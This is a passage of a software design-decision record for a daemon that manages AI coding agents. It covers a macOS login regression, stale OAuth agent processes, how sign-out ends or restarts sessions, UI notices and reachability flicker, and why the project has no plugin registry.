and the thing being bounded is disk — which a queue does not reduce, only defers.

**Reconsider if** anything else ever writes an unbounded amount into a directory
per request, at which point the honest shape is a shared admission budget rather
than a second boolean.

**Status.** Current

### Q7.98 — Claude's browser login worked, then stopped. What actually changed?

**Question.** Signing an agent in from the browser worked. On macOS it now opens
a wizard that dies with `script: tcgetattr/ioctl: Operation not supported on
socket`, and the screen says the machine cannot run the sign-in program. The
record said this was a known limitation; the person running the fleet said it
used to work. Both were right, and the record was missing the half that explains
it.

**What changed, from the history.**

| date | commit | |
|---|---|---|
| 2026-07-31 | `16ccfeb` | browser login arrives — **agents run in a Linux container**, reached with `docker exec -i` |
| **2026-08-02** | `5e573c9` | **Phase B/C deletes the container runtime**; agents become processes on the host |
| 2026-08-08 | `c9676f4` | `loginStdio` arrives and rescues the device-code flows |

**Decision.** Nothing about claude's login broke. **macOS was never on the path
before.** Until Phase B/C the login executed inside a Linux container, where
`script` accepts a pipe on stdin and the flow works; deleting the container moved
it onto the host, and the host here is BSD.

`loginStdio` closed the gap a week later for `kimi` and `codex` — device-code
flows read nothing, so they can be handed `/dev/null`. It cannot close it for
`claude`, whose flow prints a URL and **waits for the code to be pasted back**:
taking its stdin away removes the box the code goes in. So one of the three is
permanently unreachable by wizard on a BSD host, and `agents.ts` already said so
in a comment — without saying that it had ever been otherwise, which is why the
screen reads as a regression.

**What this changes in the code.** The failure was reachable only by *tapping the
button*: `supported` folded in `script` and the CLI, not the flow's own shape, so
a control that cannot work was drawn and then died in a `<pre>`. That is the same
defect `AgentLoginSupport.supported` was created to fix, one condition short.
`loginBlockedReason` adds it, and answers *why* on the wire —
`no_script | no_cli | interactive_pty` — because each has a different remedy and
the remedy is offered on the client. `supported` is now `blocked === null` and
nothing else, so the two cannot disagree.

**Status.** Current

### Q7.99 — A daemon reported claude signed out, then an agent failed to authenticate. Two different things.

**Question.** `claude auth status` in a terminal printed `{"loggedIn": true}` while
the daemon on the same host reported `loggedIn: false`. A day later a session on
that daemon answered `Internal error: Failed to authenticate: OAuth session
expired and could not be refreshed`. Same cause?

**No, and the first explanation written here was wrong.** It said the CLI keeps a
`Claude Code-credentials` item in the login Keychain, reads it before the JSON, and
that a daemon under launchd cannot open it without a prompt nobody is there to
answer. The Keychain item is real — created 2026-08-03, last modified 2026-08-17,
while `~/.claude/.credentials.json` was rewritten 2026-08-19 — so the two stores do
disagree. **That is not what either symptom was.** Measured 2026-08-20: the same
launchd daemon reports `loggedIn: true`, and a session created on it authenticated
and completed a turn in under two seconds. Whatever the badge was reading, it was
not a Keychain the daemon cannot reach.

**What the second symptom actually is: a stale agent process, not a stale
credential.** The session's own log is unambiguous:

| | |
|---|---|
| 17:36:03 | session created, agent spawned |
| 18:46:47 | daemon restarts, agent respawned |
| **00:23:12** | the **first** prompt this session ever received — instant `authentication_failed` |

Five hours and thirty-six minutes idle, and the failure arrives on first use. At
that moment the access token on disk was valid for another 1.4 hours and the
refresh token for another two weeks; neither store had been written since *before*
the agent started. A CLI run from a shell completed an inference call, and — the
measurement that settles it — **a freshly spawned agent on that same daemon
answered normally four minutes later.**

So the credential was fine, the daemon was fine, and the process holding an OAuth
session across five idle hours was not. Restarting the agent is the remedy, and
resuming the session is what does it.

**What is left unexplained, and is recorded as unexplained.** Why the refresh
failed rather than succeeding is not established. Rotation is the obvious
candidate — several clients share one account here, and a refresh rotates the
token server-side, so whoever refreshes second loses — but nothing rewrote either
store in the window, which is what rotation would normally leave behind. Naming a
mechanism this file cannot demonstrate is how the paragraph above came to be wrong
the first time.

**The lesson worth more than the diagnosis.** The first answer was assembled by
elimination — probe, timeout, cache and PATH each ruled out — and then handed to
the one hypothesis left standing, which was never itself tested. Ruling out four
things does not prove the fifth. The test that would have caught it, *spawn a
fresh agent and see*, cost one request and was not run.

**Status.** Reversed an earlier decision

### Q7.100 — Signing out reached nothing that was already running

**Question.** A credential is read once, at spawn. So an agent started while
signed in goes on answering after its account is revoked, and a conversation
begun before a sign-out carries on as though nothing happened. Is a sign-out a
fact about the machine, or about a screen?

**Decision.** About the machine, and three paths were needed to make that true.

**Signing out ends the conversations.** `signOutSessions` stops every live session
on that agent with a new reason, `agent_signed_out`. **Ended rather than
relaunched**, which is the opposite of what saving a credential does: relaunching
here starts an agent with nothing to authenticate with, and that fails at the
first message *inside the transcript* as `Internal error: Failed to
authenticate` — the least explicable place a refusal can appear. It does not
spare a turn in flight, and that asymmetry with `takesCredentialChange` is the
point: there a credential was being added and a working turn was evidence the
credential worked; here it is being taken away, and a turn still running on it is
exactly what somebody signing out means to stop.

**A credential that went away some other way is reported by the agent.** The
sign-outs this daemon did not perform — done in a terminal, revoked elsewhere, or
simply expired — end the session too, and the signal is `isAuthFailure`:
`errorKind: "authentication_failed"` on the ACP error, read on the event pump.
That is the case that actually occurred (Q7.99), and the payload above is the one
this daemon recorded on 2026-08-20.

⚠ **A probe on the prompt path was tried first and taken back out**, and the
measurement is worth keeping. It asked the agent's CLI "is anybody signed in"
before every message, which cost a process spawn on the hot path, could only ever
be as fresh as its 3s cache, and **made the offline drivers depend on whether the
person running them was signed in** — a stub runtime inherits `LocalRuntime`, and
`resolveLoginBinary` finds the adapter's own vendored binary in `node_modules`.
CI is signed in to nothing, so it refused a prompt two unrelated assertions
expected to land, and the failure was invisible on a developer's own machine.

The replacement is not a better probe but a different *source*: the agent says
so, at the only moment that cannot be stale, and it costs nothing. What is given
up is that the first message after an external sign-out is still sent and still
fails — it was going to fail with the probe too, whenever the cache was stale —
and what is gained is that the failure now *ends* the conversation instead of
being one internal error among many. `signedOut` was deleted rather than left
unused, for `paths.ts`'s reason about `atOrUnderReal`.

⚠ **The kind, never the message.** `describeError`'s text is the agent's own prose
and moves with its version; matching "authenticate" in it would end somebody's
conversation because of a sentence their CLI happens to print. `isAuthFailure`
walks two `unknown`s defensively and answers `false` for every shape it does not
recognise, because it runs on the pump and may not throw.

**Signing in reverses it, and reverses only it.** `agent_signed_out` is the record
of *who* ended a session, so `reloadCredentials` resumes exactly those and leaves
every `stopped` one alone. Reviving a hand-stopped session would be the daemon
overruling a person — which is why the reason is a reason rather than a boolean.

**Deliberately not in `DAEMON_EXIT_REASONS`.** That list is "the daemon went away
rather than anybody deciding", and it is what the boot pass brings back. A person
decided this. `autoResumable` answering `false` for it is not in tension with the
resume above: nothing brings these back *on its own*; that is the same person, on
the same machine, undoing the thing that ended them. Adding the reason made
`autoResumable`'s exhaustive switch a compile error until the decision was
written, which is what that switch is for.

**Measured.** A session that answered a prompt, then refused the next one with
`409 agent_signed_out` — "nobody is signed in to claude on this machine" — the
moment its agent's CLI reported signed out, with kimi unaffected on the same
daemon.

**Status.** Current

### Q7.102 — A refusal a person can fix does not belong in a toast

**Question.** Sending to a signed-out agent answered `409 agent_signed_out`, and
the composer drew it the way it draws every refusal: a toast. The one refusal on
this screen with an actual remedy was announced in the place with no room for
one, and the shortest life on screen.

**Decision.** Say it in the transcript, with the button that fixes it — and make
the state singular first, because two states cannot share one line.

**The daemon ends the session rather than only refusing it.** `signOutSessions`
already covered a sign-out this daemon performed; a prompt refused for any *other*
way the credential went — signed out in a terminal, revoked elsewhere, expired —
left the conversation looking live while it could never accept a message again.
Ending it with the same reason collapses both paths onto one state, so the client
has one thing to draw and signing in brings all of them back together. Guarded on
`!managed.terminal`, so a session already ended keeps the reason it had.

**The notice grew an action instead of a second boolean.** `sessionNotice`
returned `retry: boolean`; a `signIn: boolean` beside it could be true at the same
time, which means nothing and would draw two buttons for one problem. It is one
`action: "reconnect" | "sign_in" | null` — mutually exclusive by construction,
and `webcheck` walks it.

**The button navigates rather than opening anything inline.** Signing in is a
wizard or a pasted token and both already live at
`/settings/machines/:machineId/agents/:agentId`; the machine comes from the row
being read, because a sign-out is per host and somebody is looking at one
conversation on one of them.

**And the toast is suppressed for exactly that code.** The message is still
restored to the box — the conversation returns when they sign in, and their draft
is waiting in it — but the news is not told twice, once in the place that cannot
carry the remedy.

**Measured.** One daemon run, one live session: a prompt answered `202`, the CLI's
own status was switched to signed-out, and the next prompt on the same session
answered `409` with the session `exited`, `reason: agent_signed_out`. Saving a
credential then reported `restarting: 2` and the session came back `idle` with no
exit at all.

**Status.** Current

### Q7.101 — Every tab switch redrew the settings screen, and one line was why

**Question.** Switching to another window and back made Settings flicker: machine
dots blinked, and the agents panel blanked and reloaded.

**Decision.** `probeRoute` published `probing` for a machine it already knew was
online, and two screens read that as the host being gone.

The chain: `resumeMachine` calls `forgetRoute()` on every wake — correctly, since
a route learned on one network says nothing on another — so a healthy machine is
re-probed whenever the tab comes back. `probeRoute` set `reach = "probing"` and
published **before any I/O**, then `online` again up to 1.5s later. Everything
keyed on `reach` therefore changed twice for a question whose answer never
changed.

**On one screen that was not a repaint but an unmount.** `MachineAgentsSection`
tested `reach !== "online"` and replaced the panel with "not reachable right now",
so the return trip *remounted* it: `useAgentAuth` restarted from `listing: null`,
drew its spinner, issued a second `GET /agent-auth` — which shells out to every
agent's CLI and is on the 90s budget — and threw away anything half-typed into a
credential box or any sign-in wizard in progress. Once per tab switch, on the
screen whose whole purpose is "go and copy a token, come back".

**Fixed at the source**: a probe of a machine already believed reachable keeps
that belief. `probing` means *no answer yet*, and re-checking does not erase an
answer already held; `unknown` remains the value for never having asked, and a
failed probe still lands on `offline`. That covers every screen at once rather
than one predicate per caller. `daemonReadable` is the second half, for the
genuine first-load `probing`, and it is pure so all four values are walked.

**What it confirms.** `.claude/rules/web-shell.md` already states this rule for
the rail — reachability flickers, so a row may not change because of it — and the
two screens that legitimately *show* reachability had quietly become the
exception. Showing a measurement is still not a reason to take the content away
while it is being taken.

**Status.** Current

### Q7.103 — A conversation you cannot type into, under a notice that was not true

**Rule.** Three things, and they are one bug seen from three sides.
`onAuthFailure` **replaces the agent instead of ending the conversation**;
`autoResumable` answers `true` on the **prompt** trigger for `agent_signed_out`
and `stopped`; and `Composer.tsx` has **no early return at all** — nothing takes
the message box off the screen.

**Reported from a phone**, and the report was two sentences: *why does it say I
am not logged in, and why will it not let me send anything.* Both were right.

**Measured, on the reporter's own machine.** The daemon's own probe — its exact
binary (`resolveLoginBinary` finds the adapter's vendored copy), its exact
environment (`agentEnv()` plus pasted secrets, `HOME` untouched) — answered:

```
{ "loggedIn": true, "authMethod": "claude.ai", "subscriptionType": "max" }
```

The credential file had been rewritten at 14:56 the same day; it was 22:31. The
CLI had refreshed its own token hours earlier and the daemon was in no doubt
about it.

**What the screen said instead** was `nobody is signed in to claude on <machine>.
Sign in and this conversation comes back.` — drawn from `session.exit.reason` on a
row recording something that happened at some point in the past, in the present
tense, with the live probe not consulted here or anywhere near here. The button
went to a screen where the reporter was already signed in.

**The chain, and every link was defensible on its own.**

1. Claude's OAuth session expired mid-conversation and the agent emitted
   `errorKind: "authentication_failed"`.
2. `onAuthFailure` ended the session with `agent_signed_out` — because "the
   credential is gone, so every later message would fail the same way".
3. `autoResumable` answered `false` for that reason on **both** triggers, so
   neither a boot pass nor a message could bring it back.
4. `reloadCredentials` is the only reversal, and every one of its callers is an
   in-app credential **write** — `PUT`/`DELETE /agent-auth/:agent`. A CLI
   refreshing its own token reaches none of them. Neither does signing in from a
   terminal.
5. `showsAsEnded` was true, so `Composer.tsx` returned `null` and there was
   nothing to type into.

A state with no exit from inside the app, reached by an expiry that had already
repaired itself.

**Step 2 was already known to be wrong.** Q7.99 recorded it in August: a session
idle 5h36m reported `authentication_failed` on its *first* prompt while the token
on disk was **still valid for another 1.4 hours**, and a freshly spawned agent
worked four minutes later. What goes stale is the agent process, not the
credential. Ending the conversation therefore destroyed the half that was fine and
kept nothing that was broken — and the entry that measured this did not change the
code it was about.

**So the failure is drawn and the process is replaced.** The error event is
already in the log — `record` appends it one statement before `isAuthFailure` is
consulted — so what happened is in the transcript, where somebody can read it and
send again, which is what a chat with an agent does. `restartAgent` is the path a
config change already takes and stops with `config_changed` **deliberately rather
than inventing a reason**: it is "the daemon took the agent away and is bringing it
straight back", it is in `DAEMON_EXIT_REASONS` so a client draws *reconnecting*,
and a new `ExitReason` member would read as `showsAsEnded` on every client older
than it — the exact failure being removed.

**Armed once per prompt**, which is the difference between a retry and a loop. A
credential that really has gone fails the fresh agent the same way, the second
failure lands in the transcript beside the first, and nothing restarts again until
somebody sends another message. The retry is driven by the person; a revoked
credential costs one spawn per message they choose to send. A restart already in
flight is also left alone — `this.restart` is a single field holding a config to
put back and a promise `whenRestarted` waits on, and a second writer loses the
first's receipt for ever.

**`stopped` moved too, and it is the same argument rather than a second one.** A
prompt is not the daemon deciding anything: it is the person who pressed Stop
typing into that conversation again. `boot` stays `false` for both reasons, so
nothing revives anything on its own — which is the whole of what the old rule
protected. `start_failed`/`start_timeout` are answered by the `agentSessionId`
guard, and `agent_kill_failed` stays refused because `agentConfirmedDead: false`
means the old agent may still hold the conversation file.

**The composer is unconditional, and that is a rule rather than today's
behaviour.** The early return was already half-deleted once, for the deploy case —
"only a session somebody *ended* loses its composer" — and this is the other half.
A conversation you cannot type into is a dead end whatever put it there, and this
app cannot enumerate the ways in advance; that is what the episode demonstrated.
What is gated is **Send**, never the box, and nothing about the sending path
changed.

**The notice says only what its row can know**, and the remedy is the one that
worked all along: `POST /sessions/:id/resume` calls `managed.resume()` with **no
`autoResumable` gate**, so Reconnect could have brought these back at any point.
It was simply never drawn, because `sessionNotice` handed this reason a `sign_in`
action instead.

**Where "sign in" is earned.** The `resumeStalled` branch, and only there, and only
for `agent_auth_required` — which means the daemon spawned the CLI, asked it to
reopen the conversation and was refused. That is a measurement rather than a
memory, and it is the one place in this app entitled to say somebody is not signed
in. `webcheck` asserts the exit-reason line claims nothing about the present at
all.

**A fourth thing fell out of the same read, and it had been green the whole
time.** `Composer.tsx` suppressed its toast on `cause.code === "agent_signed_out"`
— a code the daemon stopped sending when the probe on the prompt path was deleted;
the route answers `session_terminal`. `webcheck` asserted the *literal string* was
present in the file rather than that the client and the daemon agreed, so the
branch was unreachable and the check stayed green while the toast it exists to
suppress fired anyway, saying "this session has ended" over a notice already
saying it better. The assertion reads the code off `src/server.ts` now.

**Status.** Reversed an earlier decision

### Q7.104 — Is there a plugin market, and why not?

**Position.** There is no registry, no directory, no search and no signature
checking. A plugin is a file somebody has, installed by somebody who chose it.

**Why not, and this is the strongest of the reasons.** A registry is something to
poll, and polling it would be a **second** request the daemon makes on its own
behalf — against the property that a control-plane outage costs reachability
rather than work in flight (Q1.9, Q1.615). It would also be a channel by which
code arrives on somebody's machine without them naming it, which is Q7.42's
argument about fleet rollout wearing different clothes.

**What is deliberately not conceded either.** Signature verification. It sounds
like the missing safety and is not: the thing a signature proves is *who built
this*, and the trust decision here is already "I chose this file", which is the
same decision `npm i` and a git clone present. A signature scheme with no registry
to anchor it is ceremony.

**What would change the answer.** Somebody wanting to hand one plugin to a whole
company. That is Q7.106, and it needs no registry inside the daemon — the browser
already talks to both sides.

**Status.** Deliberate non-goal

### Q7.105 — Should a plugin be able to draw in the transcript, or add a slash command?

**Position.** Neither, in the first version, and the seams are named rather than
half-built: `renderEvent` in `EventList.tsx` for a transcript card, `buildCommands`
in `ui/commands.ts` for a slash command.

**Why not yet.** Both are inside the two screens with the most rules attached to
them and the least room for somebody else's content. `buildTail` rebuilds the
whole node array on every streamed token, and what keeps that cheap is a memo
comparator over a closed node union; a plugin-supplied card lands inside that.
Commands are a merge of what the agent published with controls synthesized by
*category* rather than by id, with a precedence rule between them — a third source
needs its own place in that order, decided rather than appended.

**What it would take.** For a card: a `TailNode` member that `sameNode` can
compare without allocating, and a decision about what a plugin's card does when it
is inside a folded run. For a command: a third source in `buildCommands` with a
stated precedence against the other two, and an answer for what happens when two
plugins claim one name.

**Why the four that exist were enough to ship.** The demo plugin uses all of them
and wants neither of these. Until something real does, adding them is guessing at
the shape.

**Status.** Not built

### Q7.106 — Could an organisation hand one plugin to everybody?

**Position.** Not today, and the shape it would take is known and needs **no
change to the daemon at all**.

**What it would be.** The control plane holds a catalogue — an archive and its
manifest, with a rule about who may see it — and the *browser* is the courier: it
already talks to the control plane and to each daemon, so it fetches the archive
from one and `POST /plugins` it to the other. Paid works by the catalogue refusing
to serve the bytes, which is a `403` on a route below the auth gate rather than
any new mechanism.

**Why that keeps every property.** The daemon still makes exactly one
control-plane request ever (Q1.9): it is not the one fetching. Installing is still
an act by whoever owns the machine, so Q7.42 is untouched. And it is additive —
new tables on the control plane, which its schema rule already allows, plus a
screen.

**What it does not do, and would not.** Install silently on somebody's machine.
That is fleet rollout, and it is refused for Q7.42's reasons rather than because
nobody has written it.

**Why it is not built.** Nobody has needed it yet, and building a catalogue before
there is a plugin worth distributing is building the market this record has
already declined once (Q7.104).

**Status.** Not built
